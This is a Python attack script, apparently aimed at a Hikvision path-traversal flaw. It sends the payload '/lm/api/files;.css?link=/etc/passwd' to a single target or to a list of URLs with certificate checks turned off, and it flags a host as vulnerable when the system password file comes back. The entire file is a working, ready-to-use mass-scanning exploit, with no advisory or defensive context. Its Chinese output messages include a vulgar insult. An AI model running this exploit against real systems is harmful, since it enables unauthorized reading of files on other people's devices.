import os
import sys
import argparse
import requests,warnings
from requests.packages import urllib3

urllib3.disable_warnings()
warnings.filterwarnings("ignore")


headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
    }

def main():
    banner = f'''
 ██      ██ ██              ██         ██                         ██       ████████ ██
░██     ░░ ░██             ░░         ░░                         ░██      ░██░░░░░ ░██
░██      ██░██  ██ ██    ██ ██  ██████ ██  ██████  ███████       ░██      ░██      ░██
░██████ ░██░██ ██ ░██   ░██░██ ██░░░░ ░██ ██░░░░██░░██░░░██ █████░██      ░███████ ░██
░██░░░██░██░████  ░░██ ░██ ░██░░█████ ░██░██   ░██ ░██  ░██░░░░░ ░██      ░██░░░░  ░██
░██  ░██░██░██░██  ░░████  ░██ ░░░░░██░██░██   ░██ ░██  ░██      ░██      ░██      ░██
░██  ░██░██░██░░██  ░░██   ░██ ██████ ░██░░██████  ███  ░██      ░████████░██      ░██
░░   ░░ ░░ ░░  ░░    ░░    ░░ ░░░░░░  ░░  ░░░░░░  ░░░   ░░       ░░░░░░░░ ░░       ░░ 

    '''
    parser = argparse.ArgumentParser()
    parser.add_argument("-f","--file", type=str, default="",help="批量地址如:urls.txt")
    parser.add_argument("-u","--url", type=str, default="",help="目标地址如:https://127.0.0.1")
    
    args = parser.parse_args()
    if len(sys.argv) == 1:
        print(banner)
        parser.print_help()
        sys.exit()
        
    targetFile = args.file
    targetUrl  = args.url
    
    print(banner)
    if not targetFile:
        #targetUrl
        attackUrl(targetUrl)
        
    else:
        #targetFile
        attackF(targetFile)

    
def attackF(targetFile):
    payloads = "/lm/api/files;.css?link=/etc/passwd"
    
    if(os.path.exists(targetFile)):
        with open(targetFile,'r') as f:
            for url in f:
                try:
                    response = requests.get(url=url.strip() + payloads, headers=headers,timeout=5, verify=False)
                    if "bash" in response.text:
                        print(f"\033[0;37;42m 目标: {url.strip()} 存在漏洞\033[0m")
                    else:
                        print("\033[0;37;41m 草泥马，不存在!!! \033[0m")
                except Exception as e:
                    print(f"\033[0;37;41m ERROR: {e}\033[0m")
    else:
        print(f"\033[0;37;41m {targetFile} 不存在!!! \033[0m")
    
def attackUrl(targetUrl):
    payloads = "/lm/api/files;.css?link=/etc/passwd"
    try:
        response = requests.get(url=targetUrl.strip() + payloads, headers=headers, timeout=5, verify=False)
        if "bash" in response.text:
            print(f"\033[0;37;42m 目标: {targetUrl.strip()} 存在漏洞\033[0m")
        else:
            print("\033[0;37;41m 草泥马，不存在!!! \033[0m")
    except Exception as e:
        print(f"\033[0;37;41m ERROR: {e}\033[0m")


if __name__ == "__main__":
    main()